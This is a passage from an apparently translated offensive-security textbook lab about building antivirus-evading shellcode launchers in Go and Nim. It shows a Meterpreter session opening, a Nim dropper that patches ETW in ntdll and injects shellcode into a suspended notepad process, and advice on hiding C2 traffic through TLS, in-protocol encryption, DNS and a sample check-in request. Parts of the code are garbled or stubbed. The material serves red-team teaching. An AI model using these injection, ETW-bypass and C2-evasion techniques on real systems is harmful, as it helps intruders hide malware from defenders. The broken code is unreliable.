
`GOOS=windows` `GOARCH=amd64` `go build -o /tmp/CreateFiber.exe createFiber.go`

现在随着我们的 `msfconsole` 监听器运行，我们可以在 Windows 机器上运行该代码：

```powershell
Microsoft.PowerShell.Core\FileSystem:\\10.0.0.40\ghh\.CreateFiber.exe
```

在我们的 Linuxpreter 会话中，我们现在应该看到一个新的可以交互并用它执行命令的会话：

```text
[*] Meterpreter session 5 opened (10.0.0.40:4444 -> 10.0.0.20:58764)
at 2021-09-25 08:07:59 +0000
msf6 exploit(multi/handler) > sessions -i 5
[*] Starting interaction with 5...
meterpreter > getuid
Server username: GHH\target
```

我们在 Windows 系统上的二进制文件将继续执行，直到我们退出 Meterpreter 会话，然后它应该退出。你可以研究 Kali 实例上 `go-shellcode` 目录中的额外示例，并尝试修改其他示例在目标机器上运行。

# 创建 Nim 启动器

Nim 是另一种编译语言，支持多种操作系统，并吸收了 Python 等其他语言的部分特性，创建出一种更对用户友好的语言，并可以编译为 C、C++、Objective-C 和 JavaScript。因此，代码可以编译为这些中间语言之一并包含在其他项目中，也可以直接编译为二进制文件。Nim 的灵活性是其受欢迎的原因之一，而且二进制文件的签名足够不同，可以绕过传统的杀毒软件（AV）检测。

目前使用 Nim 的仓库并不多，但它引起了威胁者和伦理黑客的关注。研究 Nim 的人员之一是 Marcello Salvati，被称为 Byt3，位于 `https://github.com/byt3`

## 实验 7：编译和测试 Nim 启动器

在本实验中，我们将使用 Nim 创建一个绕过 Windows 事件跟踪（ETW）的启动器。这种代码我们以前见过，模式看起来很熟悉。为了实现这一点，我们将使用以下步骤：

- 启动一个新进程（例中为 `notepad.exe`）
- 挂起进程
- 使用必要的权限打开进程
- 在进程中分配内存
- 写入 shellcode
- 创建远程线程执行 shellcode
- 重置内存保护

```nim
proc injectRemoteThread(I, T)(shellcode: array[T]): void =
    let tProcess = startProcess("notepad.exe")
    tProcess.suspend(0)
    let pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, cast[DWORD](tProcess.processID))
    let rPtr = VirtualAlloc(pHandle, NULL, cast[SIZE_T](shellcode).len, COMMIT, PAGE_EXECUTE_READ)
    var bytesWritten: SIZE_T
    let wSuccess = WriteProcessMemory(pHandle, rPtr, unsafeAddr shellcode, cast[SIZE_T](shellcode).len), addr bytesWritten)
    var origProtect: DWORD
    VirtualProtect(rPtr, cast[SIZE_T](shellcode).len, PAGE_EXECUTE_READ, &addr origProtect)
    let tHandle = CreateRemoteThread(pHandle, NULL, 0, cast[LPTHREAD_START_ROUTINE](rPtr), NULL, 0, NULL)
```

`Patchntdll` 函数将覆盖 `ntdll.dll` 中的 ETW 函数。我们将使用 `VirtualProtect` 函数将内存设置为可读/可写，以便应用我们的字节。以下是实际逻辑：

```nim
proc Patchntdll(): bool =
    # 补丁 ntdll.dll 的实现
    # ...
    return true
```

```nim
when isMainModule:
    var success = Patchntdll()
    echo fmt"[*] ETW blocked by patch: {bool(success)}"
    injectRemoteThread(shellcode)
```

`/tmp/nim_dropper64.exe` 二进制文件现在应该位于 `/tmp`，当我们在我们的 Windows 机器上运行时它，我们不应该看到任何输出，但我们应该在 Metasploit 中看到一个会话返回：

```powershell
PS Microsoft.PowerShell.Core\FileSystem:\10.0.0.40\ghh\.nim_dropper64.exe[*] Applying patch[*] ETW blocked by patch: true
+   [*] 目标进程: 3128
[*] pHandle: 180
[*] WriteProcessMemory: true
\-- 写入字节: 200262
[*] tHandle: 144
[+] 已注入
```

# 网络规避

建立 C2 通道后，我们需要能够规避网络上的检测。我们通常需要规避两个控制区域。第一个是 IDS/IPS，第二个是代理检测。大多数组织在内部内部不解密 TLS 数据，但他们可能会解密访问组织外的 TLS 数据。知此此，我们有多个可以进行加密和规避的区域。

### 加密

C2 规避常用的有两种加密类型。第一种是基于 TLS 的规避。通过使用 TLS，不使用 TLS 检查的区域将无法看到流量内部，因此分析工具对流量的唯一了解就是通信频率和目的地。在可能的情况下使用 TLS 加密将有助于保护 C2 流量的完整性，并向防御者隐藏通信的结构和内容。

如果对是否存在 TLS 检查有任何疑问，建议在 C2 协议本身内部使用加密。根据通信内容的不同，并非所有内容都可以被加密（例如，对于 HTTP，标头无法加密）。但是，内容正文和 cookie 等区域是可以加密的。加密这些数据意味着即使 TLS 被拦截，C2 系统中往返发送的内容也不是立即变得透明的，且要确定 C2 系统正在采取哪些操作将更加困难。

在选择加密时，确保你选择的是已知的加密方案，而不是像基于 XOR 的加密这类基础的方案，因为像 XOR 等某些加密方案可能会受到明文攻击。像主机名这样的信息几乎总是出现在事务的第一部分。通过选择更好的加密方案（如 AES 或 RC4），你确保了数据安全得多，并使其在没有我们实际 shellcode 的情况下难以被篡改或破解流量。

### 备用协议

除了加密，某些协议比其他协议具有更好的分析性。HTTP 等协议被很好地理解，并且有许多理解它们的处理器。其他协议可能有不同的检查标准，在单个 C2 系统中混合使用协议可能有助于混淆防御者。例如，DNS 是另一个常用的协议，因为许多组织对 DNS 缺乏良好的监控或分析。然而，DNS 流量极其嘈杂，因此它用于心跳（check-ins）和信号可能比发送大量数据更好。DNS 结合如实时流传输协议（RTSP）或 WebSockets 等其他协议使用，意味着必须分析多个数据点才能获得你的 C2 系统正在做什么的完整视图。通过使用对主机名采用轮询（round-robin）的配置，我们可以让防御者也必须找到受感染系统正在使用的所有主机名，以理解离开组织的流量频率和数量。

选择网络设备可能具有且文档完备的处理器协议将进一步增加你的成功几率。边界控制可能只允许它们理解的流量，因此使用完全自定义的 C2 协议可能会被拦截，因为网络设备中没有处理该特定类型流量的处理器。

### C2 模板

C2 系统经常允许通信模板。由于 HTTP 是 C2 通信最常用的协议，因此在创建通信模板时，了解何时放置放置数据至关重要。模板设置了在与 C2 系统收发数据时放置数据的位置。例如，许多 C2 系统允许通过 GET 请求进行心跳和检索要运行的命令，以及通过 POST 请求发送回数据。一个示例 GET 请求可能如下所示：

```
GET /ping.php?id=<C2 ID> HTTP/1.1
Host: c2.derp.pro
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT)
Accept-Language: en-us
Accept-Encoding: gzip, deflate
```
